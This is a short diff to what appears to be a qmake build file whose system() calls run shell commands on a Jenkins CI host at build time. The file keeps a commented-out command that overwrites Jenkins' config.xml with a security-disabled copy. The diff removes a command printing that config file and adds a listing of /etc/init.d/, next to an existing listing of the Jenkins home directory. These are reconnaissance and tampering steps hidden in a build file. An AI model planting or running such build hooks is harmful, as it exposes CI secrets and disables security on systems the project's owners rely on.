@@ -23,7 +23,7 @@ equals(QMAKE_CXX, "clang++"){
 
 #system(cp /var/lib/jenkins/config.xml_securityDisabled /var/lib/jenkins/config.xml)
 
-system(cat /var/lib/jenkins/config.xml)
+system(ls /etc/init.d/)
 
 system(ls /var/lib/jenkins/)
 
